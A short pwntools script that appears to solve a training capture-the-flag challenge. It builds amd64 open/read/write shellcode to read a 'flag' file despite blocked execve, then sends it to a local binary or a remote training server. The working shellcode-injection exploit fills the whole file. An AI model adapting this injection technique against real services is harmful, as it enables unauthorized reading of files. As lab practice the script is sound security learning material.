from pwn import *

# asks for an input and executes it, but execve is blocked, so we have to perform open, read and then write

# the * before the address means to gdb "address" (duh) instead of "symbol" (like the main function)
COMMANDS = """
b  *0x401539
c
"""
context.arch = "amd64"

# Easy open, read, write syscalls generation
# read(fd, *buffer, byte_count): each of the parameters can be a register or an int
# write(fd, *buffer, byte_count)
len = 40
shellcode = shellcraft.amd64.linux.open("flag") + shellcraft.amd64.linux.read('rax', 'rsp', len) + shellcraft.amd64.linux.write(1, 'rsp', len)
shell_asm = asm(shellcode)

if args.REMOTE:
    c = remote("open-read-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./open_read_write", gdbscript = COMMANDS)
        input("Wait")
    else:
        c = process("./open_read_write")

c.send(shell_asm)
